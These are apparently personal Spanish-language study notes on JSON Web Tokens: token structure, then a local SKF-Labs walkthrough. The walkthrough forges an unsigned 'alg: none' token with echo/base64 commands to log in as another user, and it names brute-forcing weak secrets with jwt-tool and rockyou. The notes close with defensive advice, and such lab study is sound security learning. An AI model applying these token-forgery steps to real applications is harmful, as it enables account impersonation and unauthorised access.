
# 🔐 JWT – Enumeración y Explotación

## 📚 Parte Teórica

### ¿Qué es un JWT?

Un **JSON Web Token (JWT)** es un estándar abierto (RFC 7519) que define una forma compacta y segura de transmitir información entre partes como un objeto JSON. Comúnmente se utiliza para **autenticación y autorización**.

Un JWT tiene **tres partes**:

1. **Header (cabecera)**  
   Contiene el tipo de token y el algoritmo de firma:
```json
   {
     "alg": "HS256",
     "typ": "JWT"
   }
```

2. **Payload (carga útil)**  
    Contiene los datos que se quieren transmitir. Por ejemplo:
    
    ```json
    {
      "id": 1,
      "iat": 1753132482,
      "exp": 1753136082
    }
    ```
    
    - `iat`: Fecha de emisión del token (issued at).
        
    - `exp`: Fecha de expiración del token.
        
3. **Signature (firma)**  
    Se usa para validar que el token no ha sido modificado. Se genera así:
    
    ```
    HMACSHA256(
      base64UrlEncode(header) + "." + base64UrlEncode(payload),
      secret
    )
    ```
    
    La firma **protege la integridad del token**, pero **no cifra el contenido**.
    

---

## ⚙️ Parte Práctica

### 🧪 Laboratorio 1 – JWT Inseguro con Algoritmo `none`

Usaremos el repositorio [SKF-Labs](https://github.com/blabla), específicamente el laboratorio de NodeJS sobre JWT.

#### ▶️ Preparación del entorno

1. Clonamos el repositorio y navegamos al directorio:
    
    ```sh
    cd nodeJs/JWT-null
    npm install
    npm start
    ```
    
    El servidor escuchará en el puerto `5000`.
    
2. En el sitio veremos un formulario de login. Tenemos dos usuarios:
    
    - `user` / `user`
        
    - `user2` / (no tenemos su contraseña)
        

#### 🧩 Objetivo

Loguearnos como `user2`, manipulando la cookie JWT que obtenemos al iniciar sesión como `user`.

#### 🔍 Visualización del token

![[Pasted image 20250721180358.png]]

Al iniciar sesión con `user:user`, recibimos este token JWT:

```json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzUzMTMyNDgyLCJleHAiOjE3NTMxMzYwODJ9.HWT1g1bVzwyvuqbvYXc-cgsCQEyMThyt59GPmo9vHuQ
```

Si lo llevamos a [jwt.io](https://jwt.io/), obtenemos:

```json
# Header
{
  "alg": "HS256",
  "typ": "JWT"
}

# Payload
{
  "id": 1,
  "iat": 1753132482,
  "exp": 1753136082
}
```

La firma no puede ser verificada porque no conocemos el `secret`.

---

### 🔧 Explotación: Cambiando el Algoritmo a `none`

Algunas implementaciones incorrectas de JWT **permiten usar el algoritmo `none`**, lo que desactiva la verificación de la firma. Vamos a explotarlo.

#### 📦 Construcción manual del JWT

1. Codificamos el header:
    
    ```sh
    echo -n '{"alg": "NONE","typ": "JWT"}' | base64
    ```
    
2. Codificamos el payload para suplantar a `user2` (id=2):
    
    ```sh
    echo -n '{"id": 2, "iat": 1753132482,"exp": 1753136082}' | base64
    ```
    

> ⚠️ Usamos `-n` en `echo` para evitar saltos de línea (`\n`), que romperían el token.

3. Combinamos ambas partes así:
    
    ```json
    eyJhbGciOiAiTk9ORSIsInR5cCI6ICJKV1QifQ.eyJpZCI6IDIsICJpYXQiOiAxNzUzMTMyNDgyLCJleHAiOiAxNzUzMTM2MDgyfQ.
    ```
    

> ❗ Si alguno de los fragmentos termina en `=` o `==`, **eliminalos**, ya que rompen la validación.

4. Pegamos ese JWT en el `localStorage` como cookie del sitio.
    

#### ✅ Resultado

La aplicación, al no verificar correctamente la firma (por usar `alg: none`), nos autentica como `user2`.

---

### 💥 Explotación con Fuerza Bruta

En algunos casos, el algoritmo de firma no está desactivado, pero el **`secret` es débil o predecible**. Por ejemplo:

![[Pasted image 20250721192350.png]]

#### 🔐 Ataques posibles:

- Usar herramientas como `jwt-cracker`, `jwt-tool`, o diccionarios (`rockyou.txt`) para hacer fuerza bruta y descubrir el secreto.
    
- Una vez obtenido el `secret`, podemos modificar el payload y regenerar la firma para crear un JWT válido y manipulado.
    

---

## 🧠 Conclusiones

- JWT es una tecnología poderosa, pero **una mala implementación puede dejar vulnerabilidades críticas**.
    
- Nunca se debe permitir el uso del algoritmo `none` en entornos productivos.
    
- Se debe usar una clave secreta fuerte, aleatoria y con suficiente longitud.
    
- Verificar siempre la firma del JWT antes de confiar en su contenido.
    

---

## 🛠 Herramientas útiles

- [jwt.io](https://jwt.io/) – Para decodificar y testear JWTs.
    
- [`jwt-tool`](https://github.com/ticarpi/jwt_tool) – Herramienta para manipular y atacar JWTs.
    
- [`Burp Suite`](https://portswigger.net/burp) – Excelente para interceptar y modificar tokens.
    


---
[[OWASP]]
